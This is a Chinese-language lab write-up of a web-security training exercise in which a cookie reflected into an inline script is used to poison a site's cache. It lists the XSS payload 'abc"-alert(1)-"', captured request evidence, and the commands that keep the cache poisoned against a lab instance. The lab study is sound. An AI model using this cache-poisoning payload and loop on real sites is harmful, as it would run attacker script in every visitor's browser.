---
title: "lab-web-cache-poisoning-with-an-unkeyed-cookie"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-with-an-unkeyed-cookie

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning with an unkeyed cookie(/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)
- 实例:https://0a5c0046034bf41980b03f89005300de.web-security-academy.net
- 判定目标:投毒缓存,使访客浏览器执行 `alert(1)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 首页 head 内联脚本:`data = {"host":"…","path":"/","frontend":"<fehost cookie>"}`。
   `frontend` 的值即请求里 **`fehost` cookie** 的原样回显(默认响应 `Set-Cookie: fehost=prod-cache-01`)。
2. 缓存键**不含 Cookie**:`/` 可缓存(`max-age=30`,无 `Vary`),Cookie 只影响 origin 渲染。
   → `fehost` 未键控,JSON 直接拼进 `<script>`,可越出字符串。
3. 载荷(经典):`Cookie: fehost=abc"-alert(1)-"`
   渲染为 `"frontend":"abc"-alert(1)-""` → JS 求值 `"abc" - alert(1) - ""` 先执行 `alert(1)`。
4. 投毒:`GET /` 带该 Cookie 头(cache miss → 写回);复验裸 `GET /` → `X-Cache: hit` 且 payload 在体内。
5. 访客访问 `/` → 执行 `alert(1)`。`poison_loop` 每 8s 续投保持 30s TTL,约 1 分钟内 solved。

## 证据摘录

```
GET / (Cookie: fehost=abc"-alert(1)-") -> 200, cache-control: max-age=30, x-cache: miss
  data = {…,"frontend":"abc"-alert(1)-""}
GET / (无 Cookie)                       -> x-cache: hit, age 6, 同一 payload
solved_check <inst> -> solved: true
```

## 复现命令

```
lab_launch launch D131A4D5F8A6A7E2AE584E9BC217208C223CAD4BAC3AED016482305228D68FB2 --widget-source /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie --jar /tmp/b8-jar3.json
poison_loop "<inst>/" --header 'Cookie: fehost=abc"-alert(1)-"' --interval-secs 8 --count 70 --jar /tmp/b8-jar3.json
solved_check "<inst>" --jar /tmp/b8-jar3.json
```

注:本题无需利用服务器。`poison_loop` 先写 jar cookie 再写 `--header`,同名头覆盖,故可直接控制 `fehost`。
